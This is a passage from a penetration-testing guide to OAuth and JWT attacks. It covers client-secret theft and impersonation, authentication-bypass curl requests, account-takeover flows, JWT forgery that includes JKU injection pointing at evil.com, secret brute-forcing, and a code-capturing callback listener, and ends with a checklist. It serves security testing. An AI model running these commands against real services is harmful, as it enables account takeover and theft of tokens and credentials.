docker save image_name -o image.tar
tar -xf image.tar
grep -r "client_secret" .

# CI/CD log exposure
# Check Jenkins, GitHub Actions, GitLab CI logs
# Look for echo statements that print environment variables

# After finding client_secret, impersonate the client
curl -X POST https://oauth.target.com/token \
  -u "CLIENT_ID:CLIENT_SECRET" \
  -d "grant_type=client_credentials" \
  -d "scope=admin"

# Check if secret is actually required for public clients
# Some APIs don't validate secret for certain grant types
```

### Client Authentication Bypass

```bash
# Test if client_secret is actually validated

# 1. Try exchanging code without client_secret
curl -X POST https://oauth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=VALID_CODE" \
  -d "client_id=PUBLIC_CLIENT" \
  -d "redirect_uri=https://target.com/callback"
  # No client_secret

# 2. Try empty client_secret
curl -X POST https://oauth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=VALID_CODE" \
  -d "client_id=PUBLIC_CLIENT" \
  -d "client_secret=" \
  -d "redirect_uri=https://target.com/callback"

# 3. Try wrong client_secret
curl -X POST https://oauth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=VALID_CODE" \
  -d "client_id=PUBLIC_CLIENT" \
  -d "client_secret=wrong_secret" \
  -d "redirect_uri=https://target.com/callback"

# 4. Try client_secret in different locations
# Authorization header (Basic)
echo -n "CLIENT_ID:CLIENT_SECRET" | base64
curl -X POST https://oauth.target.com/token \
  -H "Authorization: Basic $(echo -n 'CLIENT_ID:CLIENT_SECRET' | base64)" \
  -d "grant_type=authorization_code" \
  -d "code=CODE" \
  -d "redirect_uri=https://target.com/callback"

# Client secret in query parameter
curl -X POST https://oauth.target.com/token?client_secret=SECRET \
  -d "grant_type=authorization_code&code=CODE&client_id=ID"

# Client secret in different header
curl -X POST https://oauth.target.com/token \
  -H "X-Client-Secret: SECRET" \
  -d "grant_type=authorization_code&code=CODE&client_id=ID"

# 5. Test client authentication for different grant types
# Some servers only validate for authorization_code but not refresh_token
curl -X POST https://oauth.target.com/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=REFRESH_TOKEN" \
  -d "client_id=CLIENT_ID"
  # No secret

# 6. Try using client_id that doesn't exist
curl -X POST https://oauth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=CODE" \
  -d "client_id=INVALID_CLIENT"

# 7. Try using client_id of confidential client as public
# Some servers allow confidential clients to use public flow
```

---

## Social Login Attacks

### Account Takeover via OAuth

**Real World Example (2020): Docker Hub account takeover** - Users could link their GitHub account without email verification, allowing attackers to take over accounts by creating GitHub accounts with victim's email.

```bash
# Attack scenario 1: Email mismatch account takeover
# Target app links accounts by email address without verification

# Step 1: Attacker creates account on target with attacker@evil.com
# Step 2: Attacker links social login (Google) with same email
# Step 3: Victim has Google account with victim@target.com
# Step 4: Victim logs in with Google
# Step 5: Target finds existing account with victim@target.com (attacker's account?)
# Step 6: Accounts get linked, attacker can access victim's data

# Test if email verification is bypassed
# Register with victim@target.com but don't verify email
# Then login with OAuth using victim@target.com
# If target links them, vulnerable

# Attack scenario 2: OAuth provider email spoofing
# Some OAuth providers allow setting any email
# Create account on provider with victim@target.com
# Login to target via that provider
# If target trusts provider's email without verification, account takeover

# Attack scenario 3: Same email, different provider
# Victim uses Google with victim@target.com
# Attacker creates GitHub account with victim@target.com
# If target merges accounts by email, attacker can login via GitHub

# Testing methodology:
# 1. Create test account on target with email1@test.com
# 2. Login with OAuth using same email1@test.com but different provider
# 3. Check if accounts are linked without confirmation
# 4. Check if original password still works (should be separate)
```

### Pre-Account Takeover

**Real World Example (2023): Grammarly OAuth vulnerability** - Attackers could pre-register accounts with victim emails and later take over when victims signed up via OAuth.

```bash
# Attack flow:
# 1. Attacker creates account on target with victim@target.com (no email verification required)
# 2. Attacker sets password (if applicable)
# 3. Victim later signs up using OAuth (Google/Facebook) with same email victim@target.com
# 4. Target app sees email already exists and merges accounts
# 5. Attacker can now login with password and access victim's OAuth-linked account

# Testing steps:
# Step 1: Check if email verification is required for registration
curl -X POST https://target.com/api/register \
  -d "email=victim@target.com" \
  -d "password=attacker_password"

# Step 2: If registration succeeds without verification, proceed
# Step 3: Later, login with OAuth using same email
# Step 4: Check if attacker's password still works
curl -X POST https://target.com/api/login \
  -d "email=victim@target.com" \
  -d "password=attacker_password"

# Step 5: If successful, attacker can access victim's data

# Variation: Password reset after OAuth linking
# Some apps allow setting password after OAuth signup
# Attacker could trigger password reset on existing account
```

### OAuth Provider Impersonation

```bash
# If target allows custom OAuth providers or has misconfigured provider validation

# Test if provider identifier can be spoofed
# Some apps identify provider by email domain or claim

# 1. Try registering OAuth application on provider
# 2. Set redirect_uri to target's callback
# 3. Use attacker's OAuth app ID in target's authorization

# Test if target validates provider's issuer
# Modify the iss claim in ID token
# If target doesn't validate, attacker can impersonate any provider

# Provider confusion attack
# Target supports Google and Facebook login
# Attacker creates Facebook app with Google's client ID
# Login with Facebook but target thinks it's Google
```

---

## Real World Examples

### Example 1: Facebook OAuth Vulnerability (2021)
**Impact**: Account takeover via redirect_uri bypass

Facebook allowed redirect_uri to subdomains without proper validation. Attackers could register domains like `facebook-attacker.com` and use them as redirect_uri. Combined with other issues, this led to authorization code theft.

```bash
# Exploit
https://facebook.com/oauth/authorize?
  client_id=123456&
  redirect_uri=https://facebook-attacker.com/callback&
  response_type=code
```

### Example 2: Grammarly OAuth Account Takeover (2023)
**Impact**: 5M+ users potentially affected

Grammarly allowed pre-registration of accounts without email verification. Attackers could register victim emails, then later when victims signed up via Google OAuth, accounts were merged.

### Example 3: Zoom OAuth Token Leak (2020)
**Impact**: Token exposure via Referer header

Zoom's OAuth callback page loaded external images, leaking tokens in Referer headers to external CDNs.

### Example 4: Microsoft Azure AD OAuth CSRF (2021)
**Impact**: Account linking attacks

Several enterprise applications using Azure AD OAuth did not validate the state parameter, allowing CSRF attacks on the OAuth callback endpoint.

### Example 5: T-Mobile OAuth Scope Escalation (2022)
**Impact**: Administrative API access

T-Mobile's OAuth implementation allowed scope escalation during token refresh. Attackers with a valid refresh token could request admin scopes and receive them.

### Example 6: Uber Refresh Token Vulnerability (2020)
**Impact**: Long-term account access

Uber's refresh tokens had 1-year expiration without rotation. Stolen refresh tokens remained valid for the entire year.

### Example 7: Docker Hub Account Takeover (2020)
**Impact**: Image poisoning, supply chain attacks

Docker Hub merged accounts by email without verification. Attackers could create GitHub accounts with victim emails and take over Docker Hub accounts.

---

## Tools

### OAuth Testing Tools

```bash
# BurpSuite Extensions
# - OAuth Scanner (PortSwigger)
# - JWT Editor
# - Token Analyzer

# OAuthTester - Automated OAuth testing framework
git clone https://github.com/AresS31/OAuthTester
cd OAuthTester
pip install -r requirements.txt
python oauthtester.py -u https://target.com -o report.html

# jwt_tool - Complete JWT manipulation toolkit
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python jwt_tool.py -t https://target.com/oauth -rc cookies.txt
python jwt_tool.py JWT_TOKEN -X a  # None algorithm
python jwt_tool.py JWT_TOKEN -X k -pk public.pem  # Key confusion
python jwt_tool.py JWT_TOKEN -X i  # JWK injection
python jwt_tool.py JWT_TOKEN -X s -ju https://evil.com/jwks.json  # JKU injection

# oauth2c - OAuth 2.0 CLI client
# https://github.com/cloudentity/oauth2c
oauth2c https://target.com \
  --client-id CLIENT_ID \
  --client-secret CLIENT_SECRET \
  --response-types code \
  --auth-method client_secret_basic \
  --scopes "openid profile" \
  --verbose

# OAuth2 Proxy - For testing OAuth flows
# https://github.com/oauth2-proxy/oauth2-proxy

# Keycloak - Setup local OAuth server for testing
docker run -p 8080:8080 \
  -e KEYCLOAK_ADMIN=admin \
  -e KEYCLOAK_ADMIN_PASSWORD=admin \
  quay.io/keycloak/keycloak:latest start-dev

# OIDC Debugger - Web-based OAuth/OpenID Connect debugger
# https://oidcdebugger.com/

# OAuth 2.0 Playground
# https://www.oauth.com/playground/
```

### JWT Specific Tools

```bash
# jwt-cracker - Brute force HS256 secrets
git clone https://github.com/lmammino/jwt-cracker
npm install
./jwt-cracker.js "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# jwt-hack - JWT hacking toolkit
pip install jwt-hack
jwt-hack decode JWT_TOKEN
jwt-hack brute JWT_TOKEN -w /usr/share/wordlists/rockyou.txt

# JOSEPH - JWT attack tool
git clone https://github.com/portswigger/joseph

# PyJWT - Python JWT library for testing
pip install pyjwt
python -c "import jwt; print(jwt.encode({'sub': 'admin'}, 'secret', algorithm='HS256'))"
```

### Network Monitoring for OAuth

```bash
# mitmproxy - Intercept OAuth traffic
mitmproxy --mode transparent --listen-port 8080

# OAuth callback listener (Python)
cat << 'EOF' > oauth_listener.py
from flask import Flask, request
app = Flask(__name__)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    state = request.args.get('state')
    error = request.args.get('error')
    print(f"Code: {code}")
    print(f"State: {state}")
    print(f"Error: {error}")
    print(f"Full URL: {request.url}")
    return "OK"

@app.route('/')
def index():
    return "OAuth Listener Running"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
EOF
python oauth_listener.py

# Ngrok for exposing local listener
ngrok http 5000
```

---

## OAuth 2.1 Changes

### Deprecated Features (No Longer Allowed in OAuth 2.1)

```bash
# OAuth 2.1 deprecates:

# 1. Implicit Grant (response_type=token)
# Old: response_type=token
# New: response_type=code (with PKCE)

# Test if implicit grant is still supported
curl "https://target.com/authorize?response_type=token&client_id=ID&redirect_uri=https://target.com/callback"
# If returns access_token in fragment, server is not OAuth 2.1 compliant

# 2. Resource Owner Password Credentials Grant (grant_type=password)
curl -X POST https://oauth.target.com/token \
  -d "grant_type=password" \
  -d "username=user@target.com" \
  -d "password=password123"
# Should be disabled

# 3. Bearer tokens in query strings
# Old: https://api.target.com/data?access_token=TOKEN
# New: Authorization: Bearer TOKEN

# Test if query string tokens are accepted
curl "https://api.target.com/data?access_token=STOLEN_TOKEN"

# 4. Non-HTTPS URIs for production (except localhost)
# Test if HTTP callback is accepted for production clients
```

### Required Features in OAuth 2.1

```bash
# OAuth 2.1 requires:

# 1. PKCE for all authorization code grants
# Test if authorization without PKCE is rejected
AUTH_URL="https://oauth.target.com/authorize?client_id=ID&redirect_uri=https://target.com/callback&response_type=code"
# Should return error if PKCE missing

# 2. Exact redirect_uri matching
# Test redirect_uri variations
# redirect_uri=https://target.com/callback/ (trailing slash)
# redirect_uri=https://target.com/CALLBACK (case change)
# redirect_uri=https://target.com/callback?extra=param
# All should be rejected

# 3. Refresh token rotation
# Test if old refresh tokens are invalidated after use
# (Covered in Refresh Token Attacks section)

# 4. Proof Key for Code Exchange (PKCE) with S256 only
# Test if "plain" method is rejected
code_challenge_method=plain  # Should return error
```

### Testing OAuth 2.1 Compliance

```bash
# Comprehensive OAuth 2.1 compliance test script
cat << 'EOF' > oauth2_1_test.sh
#!/bin/bash

TARGET="https://oauth.target.com"
CLIENT_ID="test_client"
REDIRECT_URI="https://target.com/callback"

echo "=== OAuth 2.1 Compliance Test ==="

# Test 1: Implicit grant should be disabled
echo "Test 1: Implicit Grant"
response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/authorize?response_type=token&client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI")
if [ "$response" = "400" ] || [ "$response" = "405" ]; then
    echo "PASS: Implicit grant disabled"
else
    echo "FAIL: Implicit grant enabled (response $response)"
fi

# Test 2: Password grant should be disabled
echo "Test 2: Password Grant"
response=$(curl -s -X POST "$TARGET/token" -d "grant_type=password&username=test&password=test" -o /dev/null -w "%{http_code}")
if [ "$response" = "400" ] || [ "$response" = "405" ] || [ "$response" = "401" ]; then
    echo "PASS: Password grant disabled"
else
    echo "FAIL: Password grant enabled (response $response)"
fi

# Test 3: PKCE should be required
echo "Test 3: PKCE Required"
response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/authorize?response_type=code&client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI")
if [ "$response" = "400" ]; then
    echo "PASS: PKCE required"
else
    echo "FAIL: PKCE not required (response $response)"
fi

echo "=== Test Complete ==="
EOF

chmod +x oauth2_1_test.sh
./oauth2_1_test.sh
```

---

## Checklist

### Reconnaissance
- [ ] Discover OAuth endpoints (.well-known, robots.txt, common paths)
- [ ] Find registered clients (JS files, mobile apps, configuration)
- [ ] Check OpenID configuration for supported features
- [ ] Identify grant types supported (code, token, password, client_credentials)
- [ ] Extract JWKS URI and public keys
- [ ] Identify supported response types and scopes

### redirect_uri Attacks
- [ ] Test open redirect vulnerabilities
- [ ] Check for subdomain takeover possibilities
- [ ] Test path traversal in redirect_uri
- [ ] Try parameter pollution techniques
- [ ] Test protocol downgrade (HTTPS to HTTP)
- [ ] Test JavaScript/data URI schemes
- [ ] Test IPv6 and localhost variations
- [ ] Test CRLF injection in redirect_uri

### Authorization Code
- [ ] Test code interception via open redirect
- [ ] Test code replay (single and race conditions)
- [ ] Check code expiration time
- [ ] Test cross-client code usage
- [ ] Test code injection attacks

### PKCE
- [ ] Test if PKCE is optional (authorization without code_challenge)
- [ ] Check if "plain" code_challenge_method is accepted
- [ ] Test weak/guessable code_verifier generation
- [ ] Verify code_verifier length validation (43-128 chars)
- [ ] Test code_verifier brute force possibilities
- [ ] Check if verifier validation can be bypassed

### Tokens
- [ ] Check for token leakage (Referer, logs, history)
- [ ] Test XSS token theft vectors
- [ ] Test refresh token rotation
- [ ] Check refresh token expiration time
- [ ] Test scope escalation with refresh tokens
- [ ] Test cross-client refresh token usage
- [ ] Test malformed token handling
- [ ] Check token validation (signature, claims, expiration)

### State Parameter
- [ ] Test if state parameter is required
- [ ] Check state value predictability
- [ ] Test state fixation attacks
- [ ] Check for XSS via state reflection
- [ ] Test parameter injection via state
- [ ] Verify state validation on callback

### Scope Manipulation
- [ ] Test scope upgrade during authorization
- [ ] Test scope escalation during token refresh
- [ ] Try scope downgrade to bypass consent
- [ ] Test scope delimiter injection
- [ ] Try empty or wildcard scopes
- [ ] Test case manipulation of scopes

### JWT Attacks
- [ ] Test algorithm confusion (RS256 to HS256)
- [ ] Test none algorithm
- [ ] Test JWK injection
- [ ] Test JKU injection (also check for SSRF)
- [ ] Test claims manipulation (sub, exp, aud, iss, scope)
- [ ] Test signature removal or truncation
- [ ] Brute force weak HMAC secrets

### Client Security
- [ ] Search for exposed client_secret (GitHub, mobile apps, logs)
- [ ] Test client authentication bypass
- [ ] Test client_secret in different locations
- [ ] Check if client_secret validation differs by grant type
- [ ] Test with invalid client IDs

### Social Login
- [ ] Test email verification bypass
- [ ] Test pre-account takeover
- [ ] Test account takeover via email mismatch
- [ ] Test OAuth provider impersonation
- [ ] Check account linking security

### OAuth 2.1 Compliance
- [ ] Verify implicit grant is disabled
- [ ] Verify password grant is disabled
- [ ] Verify PKCE is required for all public clients
- [ ] Verify exact redirect_uri matching
- [ ] Verify refresh token rotation is implemented
- [ ] Verify bearer tokens not accepted in query strings

---

## Related Topics

* [OIDC](https://www.pentest-book.com/enumeration/webservices/oidc-open-id-connect) - OpenID Connect testing
* [JWT](https://www.pentest-book.com/enumeration/webservices/jwt) - JSON Web Token attacks
* [CSRF](https://www.pentest-book.com/enumeration/web/csrf) - Cross-site request forgery
* [Open Redirect](https://github.com/six2dez/pentest-book/blob/master/enumeration/web/open-redirect.md) - URL redirection vulnerabilities
* [API Security](https://www.pentest-book.com/enumeration/webservices/api) - General API testing methodology
* [SSRF](https://www.pentest-book.com/enumeration/web/ssrf) - Server-side request forgery (via jku)
* [XSS](https://www.pentest-book.com/enumeration/web/xss) - Cross-site scripting for token theft
